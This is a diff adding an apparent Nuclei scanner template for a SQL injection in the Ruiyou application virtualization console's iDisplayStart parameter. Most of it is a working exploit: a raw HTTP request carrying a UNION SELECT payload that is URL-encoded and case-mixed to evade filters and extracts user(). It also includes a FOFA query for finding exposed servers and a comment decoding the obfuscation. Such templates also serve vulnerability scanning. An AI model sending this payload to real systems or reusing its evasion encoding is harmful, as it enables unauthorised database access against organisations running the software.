@@ -1,0 +1,32 @@
+id: ruiyou-xunihua-Console-iDisplayStart-sqli
+
+info:
+  name: ruiyou-xunihua-Console-iDisplayStart-sqli
+  author: White hats
+  severity: high
+  description: 瑞友应用虚拟化系统 Console-iDisplayStart SQL注入漏洞
+  reference:
+    - https://
+  metadata: 
+    fofa-query: '"CASMain.XGI?cmd=GetDirApp" && title=="瑞友应用虚拟化系统"'
+
+http:
+  - raw:
+      - |
+        GET /ConsoleExternalApi.XGI?key=inner&initParams=command_getAppVisitLogByDataTable__user_admin__pwd_xxx__serverIdStr_1&sign=0a3d5f4f69628f32217ea9704d12bd6d&iDisplayStart=1+%75%4e%69%4f%6e+/**/%53%65%6c%45%43%74/**/1,2,3,4,5,user()%23 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'localhost'
+      - type: status
+        status:
+          - 200
+          
+          
+#%75%4e%69%4f%6e-->uNiOn %53%65%6c%45%43%74-->SelECt
